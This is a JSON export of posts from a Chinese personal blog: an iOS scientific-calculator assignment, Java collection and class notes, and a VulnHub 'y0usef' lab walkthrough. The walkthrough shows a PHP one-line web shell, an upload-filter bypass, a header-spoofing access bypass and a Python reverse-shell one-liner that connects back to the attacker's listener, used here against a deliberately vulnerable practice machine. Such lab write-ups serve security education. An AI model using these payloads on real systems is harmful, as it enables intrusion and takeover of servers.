版本，上网查找相关漏洞，最终找到可用的漏洞利用代码。简单修改后，从 kali 上传靶机，在靶机执行后成功获取 root 权限。 在靶机 root 用户的主目录下，发现最后一个 Flag。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【iOS开发】iw01 科学计算器","slug":"iw1-calculator","date":"2022-10-19T08:01:44.000Z","updated":"2022-11-10T11:21:33.769Z","comments":true,"path":"iw1-calculator/","link":"","permalink":"http://blog.kekwy.com/iw1-calculator/","excerpt":"","text":"iOS assignment 1: Calculator App. 姓名：可弟WZ Kekwy 邮箱：&#107;&#x65;&#x65;&#x6b;&#x6b;&#101;&#x77;&#121;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109; 用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。 项目仓库：https://github.com/Kekwy/iwork1-Calculator 一、界面设计 静态布局 0x0. StackView大体分为上下两部分，上方为计算器的显示区域，下方为按键区域。 0x00. 主要约束1234Stack View.top = Safe Area.topStack View.leading = Safe Area.leadingSafe Area.bottom = Stack View.bottomSafe Area.trailing = Stack View.trailing 使当前控件大小与父控件大小一致，即填充满父控件。 0x01. 显示区域（View1） View：为该区域提供指定的背景色。 Stack View：管理两个主要的UILabel。 Exp Label：显示表达式； Res Label：显示表达式的运算结果； 主要约束：纵向填充，左右边缘与 View 始终存在10的间隔。 0x02. 按键区域（View2） VIew：为按键区域提供指定的背景色。 Stack View：管理附加按键区与常规按键区。 主要约束：将按键区的高设置为屏幕高的70%：View.height = 0.7 × height 0x020. 常规按键区 前四行按钮： 填充策略为 Fill Equally； 每行四个按钮由一个 Stack View 管理，填充策略同样为 Fill Equally； 通过约束将其高度设置为整个按键区高度的66%。 后两行按钮： 包含两个 Stack View。位于左侧的 Stack View 管理左侧六个按钮，排成两行，其中每行三个按钮又由一个 Stack View 管理；位于右侧的 Stack View 中只有作为等于操作键的一个按钮，可使其高度约为其他按钮的两倍。 通过设置约束，将左侧 Stack View 的宽约束为整个常规按键区宽度的75%。 0x021. 附加按键区 在切换为科学计算器（设备横屏）时自动显示 与常规按键区类似，每行三个按钮由一个 Stack View 管理，该部分所有 Stack View 的填充方式均为 Fill Equally。 设置约束，将管理整个附加按键区的 Stack View 的宽设置为整个按键区宽的3&#x2F;7。 0x022. 按钮细节通过设置按钮属性 layer.cornerRadius 设置按钮圆角的弧度。竖屏状态设置为20，横屏状态设置为40. 0x1. D&#x2F;R Show Label 用于显示当前的计算模式是弧度制（Rad）还是角度制（Deg）。横屏模式下显示于显示区域的左上角（通过约束实现），竖屏模式自动隐藏，可通过相关功能按键进行切换。 二、功能实现0x0. 基础功能0x00. 用户输入处理用户每次点击按钮时，计算器会执行其运行逻辑。对于非功能按钮，用户输入会在 ViewController 中被追加在当前表达式之后，然后整个表达式会被传入 Calculator 进行解析。 若用户点击功能性按钮，将在 ViewController 中调用相应的函数进行处理。 0x01. 主要运算逻辑 良好的支持多优先级操作符 使用中缀表达式转后缀表达式的计算思路，参考《数据结构》。为每个操作符设置栈中优先级和栈外优先级，天然的支持多优先级运算，即良好的支持了科学计算器中出现的多个复杂操作符。 12345678910111213let isp = [&quot;#&quot;: 0, &quot;(&quot;: 1, &quot;×&quot;: 5, &quot;÷&quot;: 5, ... ] let icp = [&quot;#&quot;: 0, &quot;(&quot;: 10, &quot;×&quot;: 4, &quot;÷&quot;: 4, ... ] 同时设置两个栈结构，一个用于保存操作数，另一个用于保存操作符，当有操作符退栈时，根据其运算规则从操作数栈中退出若干操作数，进行运算后将结果压入操作数栈。 12345678910111213141516171819private func calSubExp(opt: String) -&gt; Bool&#123; ... switch opt &#123; case &quot;×&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num1 * num2) case &quot;÷&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num2 / num1) case &quot;%&quot;: ... 0x02. memery 操作主要处理 memery 中出错和 memery 为空的情况： 1234567891011121314public func memeryRead() -&gt; String &#123; if empty &#123; return &quot; &quot; &#125; else if isError &#123; return &quot;ERROR&quot; &#125; return String(memery)&#125;public func memeryClear() &#123; memery = 0.0 empty = true isError = false&#125; 0x03. 角度制与弧度制的切换计算三角函数时，根据当前计算器的模式对操作数进行转换（浮点数精度可能导致误差）： 123if !isRad &#123; // 表示处于角度制模式 tmp = 360 * tmp / (2 * acos(-1.0))&#125; 0x04. 按钮功能切换（函数与反函数之间的互换）当使用者点击 inv 按钮时，会更改部分按钮的 title。被更改 title 的按钮被点击时，在根据新的 title 在 buttonTouched 中执行对应的分支。再次点击 inv 会复原这些按钮之前的 title，即实现按钮功能的切换。 1234567891011121314151617func doInv() &#123; if isInv &#123; lnButton.setTitle(&quot;ln&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;log&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos&quot;, for: UIControl.State.normal) tanButton.setTitle(&quot;tan&quot;, for: UIControl.State.normal) isInv = false &#125; else &#123; lnButton.setTitle(&quot;eˣ&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;10ˣ&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin⁻¹&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos⁻¹&quot;, for: UIControl.State.normal) tanButton.setTitle(&quot;tan⁻¹&quot;, for: UIControl.State.normal) isInv = true &#125;&#125; 0x05. 转动设备时的界面切换重写 didRotate 对设备旋转时的事件进行处理： 123456789override func didRotate(from fromInterfaceOrientation: UIInterfaceOrientation) &#123; let device = UIDevice.current if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; //横屏时候要做的事 do something launchScienceMode() &#125; else &#123; launchNormalMode() &#125;&#125; 设备旋转为横屏时，调用 launchScienceMode： 显示附加按键区，更改按钮 title 的字号，更改按钮四个角的弧度。 设备旋转为竖屏时，调用 launchNormalMode： 隐藏附加按键区，恢复按钮 title 的字号，恢复按钮四个角的弧度。 0x1. 辅助功能0x10. 等于操作的作用 自动显示运算结果的工作模式下，等于操作符的作用 使用者点击等于操作符时，会将当前的待计算表达式替换为当前的运算结果。 0x11. 更好的删除操作一般状态下使用者点击删除按钮会删除表达式中前一个字符，但当前一个字符与其之前的若干字符为一个整体时，会将其一同删除。（如 sin( 会作为一个整体同时删除） 0x12. 面向用户的报错机制当计算过程中遇到任何语法错误无法向下计算时，会返回运算结果“ERROR”提示用户更改表达式，而不会继续解析格式错误的表达式。 三、问题与解决0x0. 使 Stack View 中的空间按比例布局 tags: Swift; StoryBoard; Stack View; xcode; iOS; 比例; 布局; 控件; UIKit; 首先将 Stack View 的属性 Distribution 更改为 Fill Proportionally。 选中需要布局的控件，按住 command 键拖到该 Stack View 上， 选择 Equal Widths （若需要纵向成比例布局，则选择 Equal Heights）添加约束。 Additional Buttons.width = 0.4285 × width 即表示控件 Additional Buttons 的宽为 Stack View 宽度的42.85%。 0x1. Swift获取当前设备的状态 tags: Swift; StoryBoard; xcode; iOS; 横屏; 竖屏; 设备状态; 123456let device = UIDevice.current // 获取当前设备对象// 通过orientation属性获取设备朝向if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; // 横屏时要做的事 ...&#125; 0x2. 代码实现修改Button字体大小 tags: Swift; xcode; iOS; UIButton; 字体大小; 123456// 获取指定大小的字体func getFont(size: CGFloat) -&gt; UIFont &#123; return UIFont.systemFont(ofSize: size)&#125;// 修改原有字体expLabel.font = getFont(size: 38.0) 0x3. 设置圆形的Button在 xcode 中为 Button 添加如下属性： 代码实现： 1dotButton.layer.cornerRadius = 40.0 该属性为 Button 四角的弧度，经调整后即可实现圆形的 Button。 四、成果展示0x00. 完整流程https://blog.kekwy.com/media/iw1/01.mp4 0x01. 压力测试（随便乱按）https://blog.kekwy.com/media/iw1/test.mov","categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"},{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第一周 vulnhub-y0usef","slug":"vulnhub-y0usef","date":"2022-09-27T04:44:31.000Z","updated":"2022-11-06T14:33:08.969Z","comments":true,"path":"vulnhub-y0usef/","link":"","permalink":"http://blog.kekwy.com/vulnhub-y0usef/","excerpt":"","text":"第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&#107;&#x65;&#101;&#x6b;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109; 2022年9月27日 一、实验准备靶机：y0usef 下载链接：https://www.vulnhub.com/entry/y0usef-1,624/ 攻击机：kali 二、实验目标取得目标靶机的root权限和2个flag。 三、实验内容 在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。 在kali中执行以下指令进行局域网主机发现： 1$ sudo arp-scan -I eth0 -l 扫描结果如下： 可以推断1出靶机 地址为 10.0.2.5 。 1： 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。 在kali中执行以下指令扫描靶机的端口状态： 1$ sudo nmap -p- 10.0.2.5 扫描结果如下： 发现开通了22、80两个端口，提示我们可以考虑靶机上的ssh与http服务。为了进一步确定各端口的用途，我们可以通过以下指令2获取对应的服务版本信息： 1$ sudo nmap -p22,80 -sV -sC 10.0.2.5 2: -p 对指定端口扫描 ​ -sV -sC 默认安全脚本扫描 扫描结果如下： 我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码： 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的robots.txt文件3： 但令人遗憾的是，我们并不能查看该文件。 3: Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。 使用whatweb工具查看web应用所采用的软件构架： 1$ whatweb http://10.0.2.5 尝试使用工具dirsearch爆破 web 服务端的路径，发现一些隐藏的路径和文件： 1$ dirsearch -u http://10.0.2.5 结果如下： 得知4服务器上有三个我们可以访问的文件： 123/adminstration/index.php/index.php/login 其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。 4: HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。 上述结果中出现的状态码的含义分别为： 状态码 含义 403 (禁止)服务器拒绝请求。 301 (永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 200 (成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 访问10.0.2.5/adminstration： 提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式： 启动Burp Suit并启用拦截，将浏览器代理设置为127.0.0.1:8080（Burp Suit的默认代理端口为8080）。 刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入X-Forwarded-For: 127.0.0.15（如下图），再将其发送。【后续被拦截的数据包都需要插入上述内容。】 发现成功进入一个登录界面： 这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。 5: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。 简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。 首先编写一个“一句话木马”的PHP 文件shell.php，内容如下： 1&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var?&gt; 尝试直接将其上传，发现网站提示文件被拒绝： 推测网站可能存在针对文件类型的过滤6，我们可以通过修改被拦截的报文中Content-Type字段的值进行绕过： 修改为：image/png： 文件上传成功了，并提供了上传完成的文件的URL。 6: 常见的过滤形式与绕过方法： 针对文件扩展名的绕过： 修改文件扩展名后，再上传。 2)针对文件类型的绕过： 修改报文中的Content-Type字段（如本次实验）。 3)针对文件内容的绕过： 在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。 通过URL访问文件： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php 进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls 指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python 得到了靶机上的python路径，说明靶机有python环境： 故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）： 1$ nc -nvlp 4444 修改对应的python代码： 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444. 将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell： 使用以下指令对反弹shell进行一个简单的升级: 1$ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; 查看&#x2F;etc&#x2F;passwd 文件7： 1$ cat /etc/passwd 注意到有以下一项： 1yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash 说明有一个叫yousef的用户可以登录系统8，且主目录为/home/yousef。 进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。 7: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开： 1用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell 8: 对于用户的登录shell： /bin/false 是最严格的禁止login选项，一切服务都不能用， /bin/nologin 只是不允许系统login，可以使用其他ftp等服务 因此我们一眼就锁定了yousef用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。 第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。 退出反弹shell，在kali的shell使用以下指令： 1$ ssh yousef@10.0.2.5 成功登入yousef后，查看该用户所在的用户组： 1$ id 发现该用户属于sudo组，查看该用户可执行的指令： 1$ sudo -l 发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份： 1$ sudo -i 查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。 至此我们实现了root权限的提取，并成功获取了所有的两个flag。 【完结撒花】","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"集合类与I/O操作","slug":"javaNotes-3","date":"2022-08-05T00:15:26.000Z","updated":"2022-08-06T15:39:01.691Z","comments":true,"path":"javaNotes-3/","link":"","permalink":"http://blog.kekwy.com/javaNotes-3/","excerpt":"","text":"数组的长度是固定的，集合的长度是可变的。 I. Collection接口 collection 接口时层次结构中的根接口，构成其的单位称为元素。 常用方法： 方法 功能描述 add(E e) 将指定的对象添加到该集合中 remove(Object o) 将指定的对象从该集合中移除 isEmpty() 返回boolean值，用于判断当前集合是否为空 iterator() 返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象 size() 返回int型值，获取该集合中元素的个数 通过迭代器遍历： 1234567import java.util.*;Collection&lt;String&gt; list = new ArrayList&lt;&gt;(); //将List实现类向上转型Iterator&lt;String&gt; it = list.iterator(); //创建迭代器while(it.hasNext()) &#123; //do something String str = (String) it.next();&#125; //遍历 tips：Iterator 的 next() 方法返回的是 Object 。 II. List集合 List集合包括List接口以及List接口的所有实现类； 允许元素重复，元素顺序就是对象的插入顺序； 包含Collection中的所有方法，此外还有如下两个重要方法： get(int index)：获得指定索引位置的元素； set(int index, Object obj)：将集合中指定索引位置的对象修改为指定的对象； 实现类：ArrayList（数组实现）、LinkedList（链表实现）。 III. Set集合 不按特定方式排序，不能包含重复元素，需要小心操作其中的可变对象； 实现类; HashSet：不保证迭代顺序永恒不变； TreeSet：额外实现了 java.util.SortedSet 接口，可以对集合中元素进行排序。 TreeSet 类增加的方法： 方法 功能描述 first() 返回此Set中当前第一个（最低）元素 last() 返回此Set中当前最后一个（最高）元素 comparator() 返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null headSet(E toElement) 返回一个新的Set集合，新集合是 toElement（不包含）之前的所有对象 subSet(E fromElement, E toElement) 返回一个新的Set集合，是fromElement（包含）对象与toElement（不包含）对象之间的所有对象 tailSet(E fromElement) 返回一个新的Set集合，新集合包含对象 fromElement（包含）之后的所有对象 IV. Map集合 一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。 常用方法： 方法 功能描述 put(K key, V value) 向集合中添加指定的可以呢与value的映射关系 containsKey(Object key) 如果此映射包含指定key的映射关系，则返回true containsValue(Object value) 如果此映射将一个或多个key映射到指定值，则返回true get(Object key) 如果存在指定的key对象，则返回该对象对应的值，否则返回null keySet() 返回该集合中的所有key对象形成的Set集合 values() 返回该集合中所有值对象形成的Collection集合 实现类： HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用） TreeMap：可排序，不允许null键。 V. File类File构造方法 通过完整路径名（包含文件名）： 1File(String pathname); 通过父路径与子路径（包含文件名）： 1File(String parent, String child); 通过父路径对象与子路径（包含文件名）： 1File(File f, String pathname); 文件创建与删除123File file = new File(&quot;word.txt&quot;);file.delete(); //删除文件file.creatNewFile(); //创建文件 常用方法 方法 返回值 说明 getName() String 获取文件名称 canRead() boolean 判断文件是否为可读的 canWrite() boolean 判断文件是否可被写入 exits() boolean 判断文件是否存在 length() long 获取文件的长度（以字节为单位） getAbsolutePath() String 获取文件的绝对路径 getParent() String 获取文件的父路径 isFile() boolean 判断文件是否存在 isDirectory boolean 判断文件是否为一个目录 isHidden() boolean 判断文件是否为隐藏文件 lastModified() long 获取文件最后修改时间","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"类的高级特性与异常处理","slug":"javaNotes-2","date":"2022-08-01T11:50:13.000Z","updated":"2022-08-04T04:25:52.401Z","comments":true,"path":"javaNotes-2/","link":"","permalink":"http://blog.kekwy.com/javaNotes-2/","excerpt":"","text":"I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。 类的路径： 同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。 指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1package 包名; 导入包： 123import 包名.*import 包名.类名import 包名.静态方法名 tips: 使用 import 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。 II. final 关键字 变量： 修饰常量变量； 对象引用被 final 修饰后无法使其指向另一个对象； Java中定义全局变量，通常使用 public static final 修饰，是能在定义时被赋值。 方法： 被 final 修饰的方法不能被重写； private 方法隐式被指定为 final 类型。 类： 被修饰的类不能被继承。 III. 内部类成员内部类 基础用法： 成员内部类的定义：（非内部类不能被声明为private或protected访问类型） 12345public class OuterClass &#123; // 外部类 private class InnerClass &#123; // 内部类 //... &#125;&#125; 内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）； 内部类中的变量与外部类变量同名时，可以使用 this 指针加以区分： 1234// 若内部类与外部类中均有变量xthis.x; // 内部类的xOuterClass.this.x; // 外部类的xx; // 同名局部变量、形参（若有） 在外部类和非静态方法之外实例化内部类对象，需要使用外部类： 12OuterClass out = = new OuterClass();OuterClass.innerClass in = out.new innerClass(); 内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。 内部类向上转型为接口; 将一个权限修饰符为 private 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程； 对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法； 12345678910111213141516171819202122interface OutInterface &#123; public void f();&#125;class OuterClass &#123; // 定义一个外部不可访问的内部类 private class InnerClass implements OutInterface &#123; // 实现接口方法 public void f() &#123; // do something... &#125; &#125; public OutInterface doit &#123; return new InnerClass(); // 将内部类向上转型为外部接口 &#125;&#125;...OuterClass out = new OuterClass();OutInterface outinter = out.doit();outinter.f();... 外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口） 局部内部类 内部类可以在类的局部位置定义（如方法） 在方法中定义的内部类只能使用方法中被 final 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。 匿名内部类123return new A() &#123; ...//内部类体&#125;; 匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。 静态内部类 创建静态内部类的对象不需要其外部类的对象； 静态内部类的对象中不能访问非静态外部类的对象。 内部类的继承1234567891011public class OutputInnerClass extends ClassA.ClassB &#123; public OutputInnerClass(classA a) &#123; a.super(); // 生成B类的外部类对象 &#125;&#125;class ClassA &#123; class ClassB &#123; &#125;&#125; IV. 异常捕捉 try-catch 语句： 123456try &#123; // 可以发生异常的代码块&#125;catch(Exception e)&#123; // 异常处理&#125; finally 语句： 无论 try 中的语句是否发生异常，都会执行 finally 中的代码块。finally 不被执行的情况： finally 中发生异常； 之前的代码中使用 System.exit() 退出程序； 程序所在的线程死亡； 关闭CPU。 tips： Exception 是 try 代码传递给 catch 代码块的变量类型； 异常处理常用的函数： getMessage() ：输出错误性质； toString() ：给出异常的类型与性质； printStackTrace() ：指出异常的类型、性质、栈层次及出现在程序中的位置。 V. Java常见异常 异常类 说明 ClassCastException 类型转换异常 ClassNotFoundException 未找到相应类异常 ArithmeticException 算术异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组中包含不兼容的值抛出的异常 SQLException 操作数据库异常 NullPointerException 空指针异常 NoSuchFieldException 字段未找到异常 NoSuchMethodException 方法未找到异常 NumberFormatException 字符串转换为数字抛出的异常 NegativeArraySizeException 数组元素个数为负数抛出的异常 StringIndexOutOfBoundsException 字符串索引超出范围抛出的异常 IOException 输入输出异常 IllegalAccessException 不允许访问某类异常 InstantiationException 当应用程序试图使用 Class 类中的 new Instance() 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常 EOFException 文件已结束异常 FileNotFoundException 文件未找到异常 VI. 自定义异常12345public class MyException extends Exception &#123; public MyException(String ErrorMessage) &#123; // ErrorMessage为要输出的错误信息 super(ErrorMessage); // 调用父类构造方法 &#125;&#125; VII. 抛出异常 throws：用于指定方法可能抛出的异常，用于将异常向上抛出。 12static void pop() throws 异常1, 异常2, ... &#123;&#125; throw： 程序在执行到 throw 语句时立即终止，其后语句都不执行； throw 抛出的异常必须使用 try-catch 语句快捕捉； 若想向上级抛出异常，必须在抛出异常的方法中使用 throws。 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"接口、继承与多态","slug":"javaNotes-1","date":"2022-07-30T07:00:16.000Z","updated":"2022-08-01T11:51:42.005Z","comments":true,"path":"javaNotes-1/","link":"","permalink":"http://blog.kekwy.com/javaNotes-1/","excerpt":"","text":"I. 类的继承权限修饰关键字： private 外部以及子类均不可访问 public 外部以及子类均不可访问 protected 外部不可，但子类可以访问 定义类时通过关键字extends + 父类类名定义继承； 子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）； 子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）； 重写时如修改方法的权限范围，只能从小到大； 重写时返回值必须与父类中同名函数返回值相同或为其子类； 子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用； 子类finalize()方法需要保证最后一个动作是调用父类的finalize()方法； 1234567891011121314151617181920212223242526272829303132333435class Test &#123; public Test() &#123; //do something &#125; public void doSomething1() &#123; //do something &#125; private void doSomething2() &#123; //do something &#125; protected void doSomething3() &#123; //do something &#125; public Test doTest() &#123; //do something &#125;&#125;class Test1 extends Test&#123; public Test() &#123; super(); //调用父类构造方法 super.doSomething1(); &#125; public void doSomething3() &#123; //do something &#125; /* private void doSomething3() &#123; //do something &#125; 写法错误 */ public Test1 doTest() &#123; //do something &#125;&#125; II. Object类 Objcect 类是所有Java类的父类。 tips：Object 类中的 getClass() 、notify() 、notifyAll() 、wait() 等方法不能在子类中重写。（被定义为final类型） Object 类中的重要方法： getClass()：返回对象执行时的Class实例。（Unity的getObejct） toString()：将一个对象返回为字符串，一般需要根据需要在子类中重写. tips：将对象打印时将自动调用该方法。 equals()：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要按需重写。 III. 对象类型的转换 向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。 1Quadrangle obj = new Patallelogram(); // 平行四边形是四边形的子类 向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。 12Quadrangle p = new Patallelogram();Patallelogram q = (Patallelogram)p; IV. 使用instanceof操作符判断对象类型可用于实现向下转换时对父类对象实例类型的判断。 语法格式：（返回值为布尔型） 12myobject instanceof ExampleClass;// myobject对象是否为ExampleClass类的实例 V. 方法的重载同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。 编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。 不定长参数也可以参与实现重载： 12int add(int a);int add(int... a); VI. 抽象类与接口 抽象类 tips： 抽象类不能实例化对象； 只有抽象类才可以承载抽象方法； 抽象方法在其子类中必须被重写。 定义抽象类的关键字 abstract 。 123public abstract class Test &#123; abstract void testAbstract();&#125; 接口： 定义接口使用关键字 interface ： 1234public interface 接口名 &#123; void doSomething(); // 自动虚方法，可以省略abstract关键字&#125; public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时； 接口中的方法必须被定义为public或abstract形式。 实现接口使用关键字 implements ： tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。 123456789101112#1class 类名 